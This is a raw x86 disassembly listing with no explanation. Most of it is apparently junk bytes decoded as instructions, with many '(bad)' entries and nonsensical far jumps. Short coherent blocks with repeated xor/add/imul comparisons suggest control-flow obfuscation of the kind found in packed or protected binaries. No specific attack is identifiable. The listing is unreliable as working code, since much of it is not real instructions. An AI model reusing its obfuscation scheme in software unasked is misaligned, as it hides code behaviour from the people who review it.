  4041a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041a6:	dec    ebp
  4041a7:	cmp    ebp,DWORD PTR [esi]
  4041a9:	lock into 
  4041ab:	mov    eax,0x122acae2
  4041b0:	popa   
  4041b1:	mov    ds:0x5333fcc8,al
  4041b6:	mov    edi,0x24ddb51a
  4041bb:	jecxz  0x40420c
  4041bd:	rcr    DWORD PTR [ecx+0x4b8489b8],cl
  4041c3:	mov    bh,BYTE PTR [esi]
  4041c5:	fiadd  DWORD PTR [esi]
  4041c7:	ss push 0x53d4fbf
  4041cd:	xor    al,BYTE PTR [esi+0x1b317b75]
  4041d3:	xchg   BYTE PTR [edi],dh
  4041d5:	or     dh,BYTE PTR [ebp+0x7181554c]
  4041db:	push   0xc4478d5b
  4041e0:	mov    ebx,0x387c0105
  4041e5:	jne    0x40424a
  4041e7:	mov    cl,0x8d
  4041e9:	add    ebx,DWORD PTR [edi+0xf0bea54]
  4041ef:	adc    al,0xb8
  4041f1:	mov    eax,ds:0xb1f7181d
  4041f6:	jbe    0x404212
  4041f8:	cld    
  4041f9:	push   edx
  4041fa:	xlat   BYTE PTR ds:[ebx]
  4041fb:	repnz data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041fe:	jbe    0x4041a1
  404200:	mov    ebp,0x2da0f5b3
  404205:	inc    esi
  404206:	xlat   BYTE PTR ds:[ebx]
  404207:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404208:	leave  
  404209:	arpl   bp,dx
  40420b:	mov    esi,0x6d9abb91
  404210:	jge    0x4041b0
  404212:	test   al,0x58
  404214:	push   0x1c3c4044
  404219:	mov    ebx,0x19c8132f
  40421e:	ins    BYTE PTR es:[edi],dx
  40421f:	pop    ecx
  404220:	mov    dl,0x56
  404222:	xchg   ecx,eax
  404223:	fimul  DWORD PTR [ebp+0x23]
  404226:	pusha  
  404227:	mov    WORD PTR [eax+eax*8-0x63a32df3],ds
  40422e:	ins    DWORD PTR es:[edi],dx
  40422f:	jmp    0xccc6:0x900735ea
  404236:	std    
  404237:	push   edx
  404238:	pop    edx
  404239:	xchg   ebp,eax
  40423a:	xchg   ebp,eax
  40423b:	sub    DWORD PTR [ebp+ebp*1-0x66348f30],ebp
  404242:	shr    al,1
  404244:	inc    esi
  404245:	rcl    DWORD PTR [ebp-0x6a],cl
  404248:	push   ds
  404249:	test   BYTE PTR [ebx+0x33d0334b],0xf8
  404250:	jmp    0x4043fa
  404255:	xchg   ebp,eax
  404256:	push   0xffffffb8
  404258:	int3   
  404259:	jns    0x404237
  40425b:	imul   eax,DWORD PTR gs:[ebp+eax*4+0x27],0x15
  404261:	jl     0x404273
  404263:	dec    edi
  404264:	mov    bh,0xed
  404266:	push   ss
  404267:	jle    0x4042e7
  404269:	mov    edi,DWORD PTR [edi+0x7e]
  40426c:	jle    0x40429f
  40426e:	sbb    eax,0x1c60a4e2
  404273:	(bad)  [esi-0x58]
  404276:	fxch   st(1)
  404278:	pop    es
  404279:	sti    
  40427a:	dec    esi
  40427b:	jecxz  0x4042cc
  40427d:	sub    BYTE PTR [eax+0x6c],dl
  404280:	pop    ebp
  404281:	or     dl,BYTE PTR [ecx+0x430bbcfa]
  404287:	mov    ds:0xd98981f1,al
  40428c:	test   eax,0x144cb3c3
  404291:	xchg   edx,eax
  404292:	mov    BYTE PTR [eax],bh
  404294:	cmp    ebx,ecx
  404296:	sahf   
  404297:	sub    eax,0x896cd858
  40429c:	cli    
  40429d:	stos   DWORD PTR es:[edi],eax
  40429e:	pop    ebp
  40429f:	das    
  4042a0:	adc    DWORD PTR [eax-0x5],edi
  4042a3:	dec    eax
  4042a4:	xchg   DWORD PTR [ecx-0x58],edi
  4042a7:	mov    edi,0x7b0576f
  4042ac:	addr16 popf 
  4042ae:	sbb    eax,0x3a0b4b2
  4042b3:	mov    eax,ds:0x4e684beb
  4042b8:	and    al,0xc0
  4042ba:	lds    ecx,FWORD PTR [edx*2+0x1f727930]
  4042c1:	mov    ds:0xe3cacbe4,eax
  4042c6:	inc    ebx
  4042c7:	cmp    esp,edx
  4042c9:	push   edi
  4042ca:	in     eax,dx
  4042cb:	rol    DWORD PTR [edx-0x50bf633c],0x77
  4042d2:	mov    bl,bl
  4042d4:	aam    0x84
  4042d6:	cwde   
  4042d7:	xchg   DWORD PTR [ebx-0x57],ecx
  4042da:	mov    ah,0x64
  4042dc:	pop    esp
  4042dd:	cmp    ecx,DWORD PTR [edi-0x27]
  4042e0:	and    esp,DWORD PTR [esi+0x3e30844d]
  4042e6:	inc    eax
  4042e7:	test   al,0xa5
  4042e9:	ret    
  4042ea:	lea    esp,[esi]
  4042ec:	fsubr  DWORD PTR [ebx-0x21757e12]
  4042f2:	gs aam 0xb9
  4042f5:	dec    esi
  4042f6:	cmp    BYTE PTR [ebx+edi*2],bl
  4042f9:	push   ebp
  4042fa:	adc    BYTE PTR [ebx+ebp*8],ah
  4042fd:	adc    ah,bl
  4042ff:	retf   0xcd47
  404302:	cs inc esi
  404304:	clc    
  404305:	gs jne 0x404334
  404308:	(bad)  
  404309:	fisub  DWORD PTR [ebp-0x17]
  40430c:	je     0x4042fb
  40430e:	sub    ah,BYTE PTR [ebp+0x5636deb4]
  404314:	ins    DWORD PTR es:[edi],dx
  404315:	rcl    DWORD PTR [edi-0x7d],1
  404318:	nop
  404319:	mov    ah,0x7a
  40431b:	fst    QWORD PTR [ebx+0x5d8ecfab]
  404321:	stos   DWORD PTR es:[edi],eax
  404322:	cmp    BYTE PTR [edi-0x221cbc44],al
  404328:	and    DWORD PTR [edx+0x57],edx
  40432b:	adc    DWORD PTR ds:0xdd772e4c,esp
  404331:	cmc    
  404332:	or     al,0xe8
  404334:	lds    ebx,FWORD PTR [eax-0x68b3f46]
  40433a:	test   eax,0x1383d0cc
  40433f:	xchg   edi,eax
  404340:	cmp    al,0xbe
  404342:	test   eax,0x4628159e
  404347:	ret    
  404348:	pop    eax
  404349:	push   ecx
  40434a:	xchg   esi,eax
  40434b:	call   0xf9964675
  404350:	(bad)  
  404351:	fidiv  WORD PTR [eax+ecx*1+0x3a]
  404355:	push   edi
  404356:	xchg   ebp,eax
  404357:	retf   0x324d
  40435a:	test   BYTE PTR [edx+esi*8],bh
  40435d:	sbb    cl,ah
  40435f:	aas    
  404360:	pusha  
  404361:	pop    edi
  404362:	xor    al,0x81
  404364:	sbb    BYTE PTR [ebx],al
  404366:	rcr    DWORD PTR [ebp-0x1b],0x3c
  40436a:	loope  0x4043cd
  40436c:	repz retf 
  40436e:	je     0x4043ef
  404370:	pop    ecx
  404371:	adc    BYTE PTR [ebx+ebp*4-0x67],cl
  404375:	aad    0x45
  404377:	and    ebx,ebp
  404379:	and    eax,0xb570f45c
  40437e:	out    dx,eax
  40437f:	out    dx,al
  404380:	adc    eax,0x6e74779e
  404385:	dec    edi
  404386:	jbe    0x404381
  404388:	or     BYTE PTR [ecx-0x6],cl
  40438b:	pop    ebx
  40438c:	pop    ebx
  40438d:	push   esp
  40438e:	mov    DWORD PTR [edi+ecx*2],esp
  404391:	stos   DWORD PTR es:[edi],eax
  404392:	loop   0x4043cb
  404394:	sar    DWORD PTR [edi-0x6cecd584],1
  40439a:	push   ds
  40439b:	pop    ebp
  40439c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40439d:	out    dx,al
  40439e:	sub    DWORD PTR [ebx],esi
  4043a0:	les    eax,FWORD PTR [edx+0x3beb1840]
  4043a6:	or     cl,BYTE PTR [esi+0x35]
  4043a9:	dec    edi
  4043aa:	xchg   edi,eax
  4043ab:	add    ah,BYTE PTR [ecx-0x43922b30]
  4043b1:	xchg   ebp,eax
  4043b2:	jno    0x40434f
  4043b4:	test   BYTE PTR [edi+0x39],al
  4043b7:	sbb    dl,BYTE PTR [esi-0x69845705]
  4043bd:	mov    bh,0xe
  4043bf:	shl    BYTE PTR [ebp+0x60c0895e],cl
  4043c5:	cld    
  4043c6:	into   
  4043c7:	add    esp,DWORD PTR [edx]
  4043c9:	sub    eax,0xd693d0e4
  4043ce:	push   edi
  4043cf:	mov    edi,0xfe68e138
  4043d4:	dec    BYTE PTR [edi+edi*4-0x3f77c7bf]
  4043db:	sbb    eax,0x251a6fcb
  4043e0:	cmp    bl,BYTE PTR [edi-0x44]
  4043e3:	xchg   edi,eax
  4043e4:	hlt    
  4043e5:	shl    DWORD PTR [ebp-0x63],cl
  4043e8:	psubusw mm4,QWORD PTR [edx+0x3e]
  4043ec:	push   es
  4043ed:	push   eax
  4043ee:	xchg   ecx,eax
  4043ef:	cld    
  4043f0:	xlat   BYTE PTR ds:[ebx]
  4043f1:	in     eax,0x19
  4043f3:	fimul  WORD PTR [edx+esi*1]
  4043f6:	sahf   
  4043f7:	or     BYTE PTR [esi+0x3f903a9],0xd1
  4043fe:	imul   edx,edi
  404401:	mov    edi,DWORD PTR [ebp-0x8]
  404404:	mov    ebx,DWORD PTR [ebp-0x10]
  404407:	sub    ebx,edi
  404409:	cmp    ebx,edx
  40440b:	ja     0x404419
  404411:	mov    edx,DWORD PTR [ebp-0x30]
  404414:	jmp    0x404613
  404419:	mov    edx,DWORD PTR [ebp-0x38]
  40441c:	mov    edi,DWORD PTR [ebp-0x4]
  40441f:	xor    edx,eax
  404421:	xor    edi,eax
  404423:	add    edi,ecx
  404425:	add    edx,ecx
  404427:	imul   edx,edi
  40442a:	mov    edi,DWORD PTR [ebp-0x8]
  40442d:	mov    ebx,DWORD PTR [ebp-0x10]
  404430:	sub    ebx,edi
  404432:	cmp    ebx,edx
  404434:	ja     0x4045ec
  40443a:	jmp    0x4045e4
  40443f:	hlt    
  404440:	mov    ah,0xbf
  404442:	add    bh,BYTE PTR [edi+0x42444505]
  404448:	pop    ecx
  404449:	mov    ds:0x93eb4fdf,al
  40444e:	pusha  
  40444f:	jp     0x404468
  404451:	jle    0x4044d1
  404453:	mov    edi,DWORD PTR [edi+0x7e]
  404456:	jle    0x404479
  404458:	sub    BYTE PTR [ecx],ah
  40445a:	jmp    0xdf4d60a2
  40445f:	pop    ebx
  404460:	or     ebx,DWORD PTR [eax-0x61]
  404463:	fnstcw WORD PTR [edx+eiz*8-0x221001b]
  40446a:	icebp  
  40446b:	sub    DWORD PTR [esp+esi*4],edx
  40446e:	and    ecx,DWORD PTR [edi]
  404470:	ror    BYTE PTR [esp+eiz*8-0x25],0x8
  404475:	cmc    
  404476:	loopne 0x4044cd
  404478:	rol    eax,0xd1
  40447b:	xchg   DWORD PTR [edx+0x73187ef5],esi
  404481:	mov    ebp,0x31d796c3
  404486:	ds cmp eax,0x4a91184d
  40448c:	stc    
  40448d:	ss jle 0x40444d
  404490:	fmul   DWORD PTR [esi+0x21c17f80]
  404496:	(bad)  
  404498:	push   edx
  404499:	(bad)  
  40449b:	lods   al,BYTE PTR ds:[esi]
  40449c:	loop   0x40446b
  40449e:	test   eax,0x988b079f
  4044a3:	pop    ss
  4044a4:	stc    
  4044a5:	sub    al,0x38
  4044a7:	inc    edi
  4044a8:	pop    eax
  4044a9:	dec    edi
  4044aa:	fwait
  4044ab:	and    DWORD PTR [edi-0x40],edi
  4044ae:	push   cs
  4044af:	jb     0x4044fc
  4044b1:	(bad)
  4044b6:	fld    TBYTE PTR [esi-0x17]
  4044b9:	mov    bl,0x60
  4044bb:	fisubr DWORD PTR [ebx-0x10]
  4044be:	push   eax
  4044bf:	scas   eax,DWORD PTR es:[edi]
  4044c0:	clc    
  4044c1:	or     edi,DWORD PTR [ebx]
  4044c3:	into   
  4044c4:	jne    0x404525
  4044c6:	int    0xd7
  4044c8:	pushf  
  4044c9:	(bad)  
  4044ca:	jle    0x404479
  4044cc:	test   BYTE PTR [eax],ch
  4044ce:	into   
  4044cf:	lahf   
  4044d0:	std    
  4044d1:	jp     0x40447a
  4044d3:	aam    0xff
  4044d5:	(bad)  
  4044d6:	mov    ds:0x9ced4265,eax
  4044db:	adc    edi,DWORD PTR [ebx]
  4044dd:	push   es
  4044de:	sbb    al,0xb4
  4044e0:	mov    BYTE PTR [ebp+0x63db65db],cl
  4044e6:	(bad)  
  4044e7:	mov    al,ds:0xd294f88d
  4044ec:	in     eax,0x6c
  4044ee:	mov    ecx,0x2dafab99
  4044f3:	test   DWORD PTR [ecx+ecx*1+0x5d],edi
  4044f7:	pushf  
  4044f8:	jmp    0x5983:0x8f1ea36b
  4044ff:	sbb    ch,0xc6
  404502:	cmp    eax,DWORD PTR [edi+0x20]
  404505:	(bad)  
  404506:	lahf   
  404507:	push   0x2ab9d76d
  40450c:	xchg   ebp,eax
  40450d:	stos   DWORD PTR es:[edi],eax
  40450e:	and    eax,0x47d275b5
  404513:	mov    ecx,0x25b9c0fa
  404518:	call   0x55b8:0x84b6e9bc
  40451f:	outs   dx,BYTE PTR ss:[esi]
  404521:	jle    0x404508
  404523:	jmp    0x404528
  404525:	imul   esp,DWORD PTR [eax+ebx*4+0x2e],0x83c74abe
  40452d:	mov    al,0xab
  40452f:	cwde   
  404530:	sbb    BYTE PTR [ecx-0x62a6fd25],cl
  404536:	pushf  
  404537:	fnstcw WORD PTR [ecx]
  404539:	sub    eax,DWORD PTR [ebp+0x38]
  40453c:	jne    0x40459e
  40453e:	or     BYTE PTR [ebp+0x5f0860f0],0x46
  404545:	mov    WORD PTR [esi+0x4575208b],?
  40454b:	in     eax,dx
  40454c:	xchg   edi,eax
  40454d:	cmp    BYTE PTR [ebx+0x78185d41],ch
  404553:	mov    ebp,0x9ed550ee
  404558:	mov    al,0x6b
  40455a:	push   esp
  40455b:	push   ds
  40455c:	push   ecx
  40455d:	mov    ds:0xc6696f07,eax
  404562:	test   BYTE PTR [eax-0x7f],al
  404565:	mov    al,0x90
  404567:	add    BYTE PTR [esi],ch
  404569:	inc    ecx
  40456a:	retf   
  40456b:	pop    ecx
  40456c:	mov    eax,0xdd9db4ce
  404571:	xor    ch,BYTE PTR [ecx]
  404573:	or     BYTE PTR [ebx],cl
  404575:	inc    ebp
  404576:	push   ds
  404577:	jae    0x4045d8
  404579:	call   0x7843:0xe36db2a6
  404580:	call   DWORD PTR [esi-0x66]
  404583:	jno    0x404514
  404585:	test   BYTE PTR [ebx],bl
  404587:	in     eax,0x8a
  404589:	jp     0x40452b
  40458b:	jbe    0x4045c9
  40458d:	xchg   ecx,eax
  40458e:	stos   DWORD PTR es:[edi],eax
  40458f:	(bad)  
  404590:	pusha  
  404591:	push   edi
  404592:	call   0x1d942c41
  404597:	loope  0x404565
  404599:	dec    edi
  40459a:	fsubr  DWORD PTR [esi+0x2fd8e6df]
  4045a0:	xor    BYTE PTR [eax+0x55ee100f],dl
  4045a6:	mov    DWORD PTR [ebx-0x20],0xdf6a0ad0
  4045ad:	fs jl  0x4045c8
  4045b0:	inc    edx
  4045b1:	xchg   esp,eax
  4045b2:	sbb    BYTE PTR [eax+0x4688790a],al
  4045b8:	xchg   edx,eax
  4045b9:	xchg   ecx,eax
  4045ba:	and    BYTE PTR [edx+0x480121bb],bl
  4045c0:	mov    ebx,0x2a818bbd
  4045c5:	dec    edi
  4045c6:	add    dh,BYTE PTR [ebp-0x5f3fbd64]
  4045cc:	pop    ebp
  4045cd:	sub    DWORD PTR [edx],edx
  4045cf:	xchg   esi,eax
  4045d0:	lods   al,BYTE PTR ds:[esi]
  4045d1:	ins    BYTE PTR es:[edi],dx
  4045d2:	dec    ebx
  4045d3:	cs jl  0x4045ce
  4045d6:	mov    esi,0x572c1798
  4045db:	fdiv   DWORD PTR [eax-0x62]
  4045de:	out    dx,al
  4045df:	jecxz  0x404564
  4045e1:	outs   dx,DWORD PTR ds:[esi]
  4045e2:	imul   ebx,DWORD PTR [esi-0x1633aa75],0x27
  4045e9:	add    BYTE PTR [eax],al
  4045eb:	add    BYTE PTR [ebx+0x7d8bc455],cl
  4045f1:	cld    
  4045f2:	xor    edx,eax
  4045f4:	xor    edi,eax
  4045f6:	add    edx,ecx
  4045f8:	add    edi,ecx
  4045fa:	imul   edx,edi
  4045fd:	mov    edi,DWORD PTR [ebp-0x8]
  404600:	mov    ebx,DWORD PTR [ebp-0x10]
  404603:	sub    ebx,edi
  404605:	cmp    ebx,edx
  404607:	mov    edx,DWORD PTR [ebp-0x38]
  40460a:	jbe    0x404613
  404610:	mov    edx,DWORD PTR [ebp-0x3c]
  404613:	mov    edi,DWORD PTR [ebp-0x4]
  404616:	xor    edi,eax
  404618:	xor    edx,eax
  40461a:	add    edi,ecx
  40461c:	add    edx,ecx
  40461e:	imul   edx,edi
  404621:	mov    DWORD PTR [ebp+0xc],edx
  404624:	mov    edx,DWORD PTR [ebp+0xc]
  404627:	mov    DWORD PTR [ebp-0x24],edx
  40462a:	mov    edx,DWORD PTR [ebp-0x8]
  40462d:	add    edx,DWORD PTR [ebp-0x40]
  404630:	mov    DWORD PTR [ebp-0x18],0xf89c8535
  404637:	mov    DWORD PTR [ebp-0x1c],edx
  40463a:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  404641:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  404648:	mov    edx,DWORD PTR [ebp-0x18]
  40464b:	xor    edx,eax
  40464d:	add    edx,ecx
  40464f:	jmp    0x404d64
  404654:	mov    edx,DWORD PTR [ebp-0x18]
  404657:	jmp    0x404801
  40465c:	dec    esi
  40465d:	(bad)  
  40465e:	(bad)  
  40465f:	push   edi
  404660:	dec    esi
  404661:	push   edi
  404662:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  404664:	xor    BYTE PTR [edx+0x2c05bf30],al
  40466a:	sahf   
  40466b:	retf   0x29f7
  40466e:	jle    0x4046ee
  404670:	mov    edi,DWORD PTR [edi+0x7e]
  404673:	jle    0x40468a
  404675:	pop    edi
  404676:	pop    edx
  404677:	jge    0x4046a1
  404679:	cmc    
  40467a:	dec    BYTE PTR [edx+edx*4-0x11]
  40467e:	aam    0x4b
  404680:	ds push ebx
  404682:	adc    al,0xf3
  404684:	sbb    dh,dl
  404686:	cmp    BYTE PTR [ecx],dl
  404688:	fist   WORD PTR [ecx-0xa]
  40468b:	imul   esp,ecx,0xffffffd4
  40468e:	push   edi
  40468f:	or     eax,0xe8074cbb
  404694:	pop    ss
  404695:	rol    BYTE PTR [ebx],1
  404697:	jno    0x4046c5
  404699:	dec    eax
  40469a:	pop    edx
  40469b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40469c:	pop    ds
  40469d:	(bad)  
  40469e:	popa   
  40469f:	into   
  4046a0:	or     eax,0x21ffa2a9
  4046a5:	push   edi
  4046a6:	sub    eax,edx
  4046a8:	fbld   TBYTE PTR [ecx]
  4046aa:	add    ecx,DWORD PTR [edx-0x22966980]
  4046b0:	pop    edx
  4046b1:	ss cld 
  4046b3:	ds jne 0x4046f8
  4046b6:	jbe    0x4046a2
  4046b8:	jnp    0x40468b
  4046ba:	and    al,0x19
  4046bc:	imul   ebp,esi,0xffffff83
  4046bf:	xor    esi,DWORD PTR [esi]
  4046c1:	add    edx,ecx
  4046c3:	div    esp
  4046c5:	inc    ebp
  4046c6:	push   ebx
  4046c7:	(bad)  
  4046c8:	out    0xed,eax
  4046ca:	stc    
  4046cb:	call   0x5a53d191
  4046d0:	push   eax
  4046d1:	pusha  
  4046d2:	jne    0x404702
  4046d4:	mov    edi,0x79ee0ea4
  4046d9:	dec    esi
  4046da:	inc    edi
  4046db:	or     eax,0x205da76a
  4046e0:	(bad)  
  4046e2:	pushf  
  4046e3:	loop   0x40468f
  4046e5:	rcr    DWORD PTR [esi],0x9b
  4046e8:	(bad)  [eax-0x11]
  4046eb:	fld    TBYTE PTR [edi-0x65]
  4046ee:	xchg   DWORD PTR [edi+0x1da709dc],eax
  4046f4:	pop    ecx
  4046f5:	int3   
  4046f6:	lea    eax,[edx]
  4046f8:	mov    ecx,0xdbb73d98
  4046fd:	mov    ah,0x0
  4046ff:	call   0x695847a
  404704:	out    0x12,eax
  404706:	std    
  404707:	mov    edi,0x531af6c7
  40470c:	dec    esp
  40470d:	ja     0x40470a
  40470f:	(bad)  
  404710:	sub    DWORD PTR ds:0xce2878b4,esi
  404716:	repnz mov bh,0xd9
  404719:	(bad)
  40471d:	sub    esp,DWORD PTR ds:0x481573a1
  404723:	xchg   edi,eax
  404724:	sub    al,0xea
  404726:	(bad)
  404729:	jmp    0x4047a4
  40472b:	pop    ebx
  40472c:	adc    DWORD PTR [esp+ecx*2-0x51],ecx
  404730:	stc    
  404731:	ret    
  404732:	xchg   esi,eax
  404733:	mov    eax,ds:0x14c6e88a
  404738:	in     al,dx
  404739:	dec    esi
  40473a:	pop    edx
  40473b:	dec    esi
  40473c:	iret   
  40473d:	xchg   ecx,eax
  40473e:	inc    ebx
  40473f:	(bad)  
  404740:	cs pop esp
  404742:	into   
  404743:	add    DWORD PTR [ebp+0x2e],ebx
  404746:	daa    
  404747:	sub    esp,DWORD PTR [esi-0x513a7bcf]
  40474d:	ror    ch,cl
  40474f:	dec    ebx
  404750:	inc    esp
  404751:	mov    BYTE PTR [eax+0x67c57e2c],ch
  404757:	jle    0x404757
  404759:	push   ecx
  40475a:	leave  
  40475b:	leave  
  40475c:	(bad)  
  40475d:	data16 loope 0x4046ee
  404760:	push   0xf8ebdc2
  404765:	sbb    DWORD PTR cs:[esp+esi*4+0x10b3b6a4],edi
  40476d:	pop    ebp
  40476e:	jns    0x40471a
  404770:	mov    edx,0xe3e6cd8a
  404775:	jns    0x40470e
  404777:	in     al,dx
  404778:	xor    dh,BYTE PTR [ecx+0x79]
  40477b:	ret    
  40477c:	in     al,0x37
  40477e:	lock enter 0xf8b3,0xf1
  404783:	je     0x404737
  404785:	test   BYTE PTR [ecx],cl
  404787:	xor    ebx,esp
  404789:	inc    esp
  40478a:	pop    ebp
  40478b:	arpl   WORD PTR [esi+0x79bc4da9],sp
  404791:	xchg   esp,eax
  404792:	retf   
  404793:	mov    bh,0xd5
  404795:	lock addr16 (bad) 
  404798:	sbb    al,0x38
  40479a:	dec    esp
  40479b:	repz sbb al,0xbc
  40479e:	sti    
  40479f:	repnz adc dh,BYTE PTR [ecx]
  4047a2:	bsr    ecx,DWORD PTR ds:0x69ee34c2
  4047a9:	mov    ebp,0x90d6f814
  4047ae:	jno    0x404804
  4047b0:	jecxz  0x4047b1
  4047b2:	dec    esi
  4047b3:	fidiv  WORD PTR [edx-0x36e3fcf5]
  4047b9:	lods   al,BYTE PTR ds:[esi]
  4047ba:	or     cl,BYTE PTR [ebx+edi*2-0x16]
  4047be:	pop    ebp
  4047bf:	dec    eax
  4047c0:	out    0x7c,al
  4047c2:	sahf   
  4047c3:	aas    
  4047c4:	mov    DWORD PTR [edx-0xd],0x7cff8fc5
  4047cb:	push   ss
  4047cc:	sar    dh,0xce
  4047cf:	jmp    0x70b3:0xcc95611a
  4047d6:	sub    DWORD PTR [edi],edx
  4047d8:	test   BYTE PTR [eax-0x1a],cl
  4047db:	out    dx,eax
  4047dc:	push   ds
  4047dd:	mov    ds:0xc460d786,eax
  4047e2:	jle    0x404776
  4047e4:	daa    
  4047e5:	xchg   DWORD PTR [ebp-0x58],esi
  4047e8:	sar    BYTE PTR [esi],0xd1
  4047eb:	xchg   ebx,eax
  4047ec:	enter  0xd2fe,0x9
  4047f0:	cwde   
  4047f1:	jmp    0x53678773
  4047f6:	mov    ch,0x59
  4047f8:	sub    al,0x17
  4047fa:	imul   ecx,DWORD PTR [ebp+ecx*8+0x1d],0x336d9ac7
  404802:	rol    BYTE PTR [ebx],1
  404804:	push   ebp
  404805:	in     al,dx
  404806:	mov    edi,DWORD PTR [ebp-0x1c]
  404809:	mov    dl,BYTE PTR [edx+edi*1+0x32729d]
  404810:	mov    BYTE PTR [ebp+0xf],dl
  404813:	mov    edx,DWORD PTR [ebp-0xc]
  404816:	jmp    0x4049c0
  40481b:	and    BYTE PTR [esi+0x5a2a321e],0x62
  404822:	add    WORD PTR [edx+0x52b1f0ba],0x57
  40482a:	les    eax,FWORD PTR [ebx+ebp*1]
  40482d:	jle    0x4048ad
  40482f:	mov    edi,DWORD PTR [edi+0x7e]
  404832:	jle    0x40484c
  404834:	mov    al,0xec
  404836:	call   0x8e4a52a9
  40483b:	je     0x4048ab
  40483d:	push   esp
  40483e:	rcr    BYTE PTR [ecx+ebp*4+0x30f2a77a],1
  404845:	test   BYTE PTR ds:0xc247358f,cl
  40484b:	jg     0x4047cf
  40484d:	push   ecx
  40484e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40484f:	idiv   BYTE PTR [eax]
  404851:	sub    eax,0x79417cc
  404856:	xor    al,0x79
  404858:	lods   al,BYTE PTR ds:[esi]
  404859:	mov    ecx,0xb09a3595
  40485e:	(bad)  [ebp+0x5e]
  404861:	outs   dx,DWORD PTR ds:[esi]
  404862:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404863:	js     0x404897
  404865:	cli    
  404866:	ficomp WORD PTR [ecx+0x4b]
  404869:	data16 xchg cl,cl
  40486c:	jp     0x404878
  40486e:	popa   
  40486f:	and    bl,dh
  404871:	pop    ebx
  404872:	int    0xc7
  404874:	xchg   ebx,esi
  404876:	dec    esp
  404877:	jmp    0xb413:0xb4388c32
  40487e:	add    cl,BYTE PTR [esi-0x7c]
  404881:	jnp    0x40483b
  404883:	rcr    edx,1
  404885:	lods   al,BYTE PTR ds:[esi]
  404886:	fsubr  DWORD PTR [esi+esi*1+0x2e]
  40488a:	imul   edi,DWORD PTR [esi+0x2d],0x60
  40488e:	ror    BYTE PTR [ebx-0x67],cl
  404891:	(bad)  
  404892:	dec    ebx
  404893:	call   0xcc9e:0xc9938740
  40489a:	mov    al,ds:0x125d32ad
  40489f:	push   edx
  4048a0:	or     BYTE PTR [edi+0x3ec2e8d3],bh
  4048a6:	xchg   ebx,eax
  4048a7:	mov    ds:0xa0c72e96,al
  4048ac:	xor    eax,DWORD PTR [ebx-0x5f]
  4048af:	(bad)  
  4048b1:	or     ebp,esi
  4048b3:	xor    DWORD PTR [ecx+0x20],ecx
  4048b6:	mov    ch,0xc9
  4048b8:	and    edi,DWORD PTR [edx+ecx*4]
  4048bb:	imul   eax,DWORD PTR [ebp+ebp*2+0x62],0xf4590f4c
  4048c3:	out    dx,eax
  4048c4:	pop    edx
  4048c5:	test   eax,0x38ece234
  4048ca:	adc    ebp,ebp
  4048cc:	(bad)  
  4048cd:	shl    esp,cl
  4048cf:	pop    ebx
  4048d0:	add    DWORD PTR [ebp-0x334b33c],ebx
  4048d6:	dec    esi
  4048d7:	out    dx,al
  4048d8:	and    ah,cl
  4048da:	outs   dx,BYTE PTR ds:[esi]
  4048db:	jmp    0x4862:0x37ae28ee
  4048e2:	fidiv  WORD PTR [eax+0x20516f83]
  4048e8:	adc    ebp,DWORD PTR [edx+0x7a66dd40]
  4048ee:	loop   0x404923
  4048f0:	pop    ds
  4048f1:	bound  edx,QWORD PTR [ecx-0x1b010a46]
  4048f7:	sbb    al,0x8c
  4048f9:	add    dh,BYTE PTR [ebx-0x10]
  4048fc:	inc    edi
  4048fd:	in     eax,dx
  4048fe:	cdq    
  4048ff:	and    BYTE PTR [edi+ebx*1],0x1e
  404903:	inc    edi
  404904:	push   ebx
  404905:	xchg   edi,eax
  404906:	test   DWORD PTR [ecx+0x3129aa09],0x9f30d05b
  404910:	mov    bh,0x1c
  404912:	and    DWORD PTR [eax+0x68],ebx
  404915:	mov    dh,0x1d
  404917:	pop    edx
  404918:	and    esp,DWORD PTR [ebx]
  40491a:	push   ebx
  40491b:	sbb    BYTE PTR [ebx+esi*2-0x379b3c0c],al
  404922:	sbb    cl,BYTE PTR [esi+0x2e58391a]
  404928:	addr16 neg ah
  40492b:	or     DWORD PTR [edx+0x18ff5297],0x58de0818
  404935:	outs   dx,BYTE PTR ds:[esi]
  404936:	push   edx
  404937:	int3   
  404938:	iret   
  404939:	pop    edi
  40493a:	pop    ecx
  40493b:	stos   BYTE PTR es:[edi],al
  40493c:	(bad)  
  40493d:	adc    edx,edx
  40493f:	scas   eax,DWORD PTR es:[edi]
  404940:	xor    eax,esi
  404942:	pop    esi
  404943:	div    BYTE PTR [ebx+eax*4]
  404946:	mov    dh,0xc8
  404948:	retf   0x7097
  40494b:	mov    fs,WORD PTR [edx]
  40494d:	es pushf 
  40494f:	jp     0x40498a
  404951:	into   
  404952:	sub    ebx,DWORD PTR [edx+0x63]
  404955:	jecxz  0x404964
  404957:	mov    edi,0xd192b2a4
  40495c:	dec    esi
  40495d:	aam    0x4d
  40495f:	inc    esi
  404960:	out    dx,al
  404961:	lods   al,BYTE PTR ds:[esi]
  404962:	or     DWORD PTR [eax],edx
  404964:	shl    DWORD PTR [ebx-0x5cf0e37b],1
  40496a:	add    DWORD PTR [eax+0xe9c3794],0xffffff9f
  404971:	pop    esp
  404972:	dec    ebp
  404973:	xchg   DWORD PTR [esi-0x30452679],esp
  404979:	mov    BYTE PTR [edx-0x64],dl
  40497c:	cmp    bh,BYTE PTR [edx+0x52]
  40497f:	sbb    ch,BYTE PTR [eax+edx*8-0x3eba3843]
  404986:	lahf   
  404987:	mov    WORD PTR [ebp-0x6b],?
  40498a:	jmp    0x404937
  40498c:	sti    
  40498d:	sti    
  40498e:	retf   0xae91
  404991:	jl     0x4049e0
  404993:	xchg   ecx,eax
  404994:	lock xor eax,0x4243ecb9
  40499a:	out    0x4e,eax
  40499c:	pop    edx
  40499d:	aad    0xc
  40499f:	cmp    eax,0xa71ab727
  4049a4:	std    
  4049a5:	mov    esi,0x93819ebe
  4049aa:	scas   al,BYTE PTR es:[edi]
  4049ab:	test   eax,0x6e0fdd14
  4049b1:	sbb    eax,0xb9871fe
  4049b6:	ss push eax
  4049b8:	xchg   esp,eax
  4049b9:	jge    0x40499b
